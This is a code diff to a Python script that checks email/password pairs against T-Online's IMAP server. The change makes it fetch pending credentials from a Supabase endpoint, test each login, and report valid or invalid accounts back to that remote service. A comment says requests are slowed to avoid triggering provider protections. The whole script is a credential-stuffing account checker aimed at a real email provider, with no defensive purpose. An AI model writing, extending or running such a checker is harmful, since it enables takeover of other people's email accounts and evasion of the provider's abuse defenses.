@@ -1,8 +1,8 @@
 import imaplib
 import time
+import requests
 
-def get_code(EMAIL_ACCOUNT, EMAIL_PASSWORD, IMAP_SERVER):import imaplib
-import time
+SUPABASE_URL = "https://uryfrvpoyhrzfgctupqk.supabase.co"
 
 IMAP_SERVER = "secureimap.t-online.de"
 IMAP_PORT = 993
@@ -20,13 +20,42 @@ def test_account(email, password):
     except Exception as e:
         return False, f"ERROR: {e}"
 
-
+"""
 with open("accounts.txt", "r", encoding="utf-8") as f:
     accounts = [line.strip() for line in f if line.strip()]
+"""
 
-for account in accounts:
+#for account in accounts:
+while True:
+    headers = {
+    }
+    account_id = None
     try:
-        email, password = account.split(":", 1)
+        # 1. Get pending account
+        response = requests.get(
+            f"{SUPABASE_URL}/functions/v1/get-t-online",
+            headers=headers,
+            timeout=30
+        )
+        
+        if response.status_code != 200:
+            print("Get account error:", response.text)
+            exit()
+        
+        data = response.json()
+        
+        if not data.get("success"):
+            print("No account:", data)
+            exit()
+        
+        account_id = data["id"]
+        email = data["email"]
+        password = data["password"]
+        
+        print("ID:", account_id)
+        print("Email:", email)
+        print("Password:", password)
+        #email, password = account.split(":", 1)
     except ValueError:
         print(f"[INVALID FORMAT] {account}")
         continue
@@ -35,10 +64,41 @@ for account in accounts:
 
     if ok:
         print(f"[+] {email} -> {message}")
-        with open("valid.txt", "a", encoding="utf-8") as out:
-            out.write(f"{email}|{password}\n")
+        valid = "yes"
+        # 3. Update account
+        response = requests.get(
+            f"{SUPABASE_URL}/functions/v1/update-t-online",
+            params={
+                "id": account_id,
+                "valid": valid
+            },
+            headers=headers,
+            timeout=30
+        )
+        
+        if response.status_code == 200:
+            print("Updated:", response.json())
+        else:
+            print("Update error:", response.text)
     else:
         print(f"[-] {email} -> {message}")
+        print(f"[+] {email} -> {message}")
+        valid = "no"
+        # 3. Update account
+        response = requests.get(
+            f"{SUPABASE_URL}/functions/v1/update-t-online",
+            params={
+                "id": account_id,
+                "valid": valid
+            },
+            headers=headers,
+            timeout=30
+        )
+        
+        if response.status_code == 200:
+            print("Updated:", response.json())
+        else:
+            print("Update error:", response.text)
 
     # Keep requests slow to avoid triggering provider protections
     time.sleep(3)
